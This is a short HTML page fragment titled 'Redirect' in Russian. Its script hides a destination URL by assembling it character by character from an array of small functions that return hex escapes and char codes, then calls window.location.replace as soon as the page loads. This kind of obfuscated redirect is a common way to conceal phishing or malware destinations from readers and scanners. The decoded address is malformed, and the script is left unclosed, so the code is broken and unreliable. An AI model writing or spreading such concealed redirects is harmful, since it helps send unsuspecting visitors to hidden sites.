  <title>Перенаправление</title>
  <script>
    const pieces = [
      function() { return '\x68'; },
      () => '\x74',

      () => String.fromCharCode(112),

      function() { return '\x3a'; },

      () => '\x65',

      z => '\x64',
      function() { return '\x65'; },
      () => '\x66',
      () => String.fromCharCode(46),
      () => String.fromCharCode(99),
      () => String.fromCharCode(111),
      function() { return '\x6d'; },

      $ => '\x73',
      function() { return '\x2f'; },
      () => '\x67',
      () => '\x69',
      function() { return '\x73'; },
      () => String.fromCharCode(116)
    ];
    const u = pieces.reduce((out, fn) => out + fn(), '');
    window.location.replace(u);
